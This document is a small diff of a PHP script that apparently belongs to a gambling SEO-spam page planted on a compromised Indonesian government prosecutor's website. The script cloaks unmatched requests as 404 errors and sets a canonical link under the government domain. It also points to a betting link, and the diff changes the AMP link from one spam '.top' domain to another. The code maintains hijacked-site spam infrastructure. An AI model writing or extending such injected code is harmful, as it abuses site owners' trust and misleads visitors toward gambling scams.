@@ -43,7 +43,7 @@ foreach ($keywords as $keyword) {
 if (!$found) {
     show404();
 }
-$amphtml = "https://galalasho.top/id/?google=$dashbrand";
+$amphtml = "https://needmariju.top/page/?google=$dashbrand";
 $canonical = "https://kejari-lampungtimur.kejaksaan.go.id/vendor/$dashbrand";
 $cta = "https://t.ly/betboss";
 $gambar = "https://res.cloudinary.com/dt3xlwq3j/image/upload/v1728309672/OIG2.SHddNCMkSiEHHR_xDuFH_no0lyu.jpg";
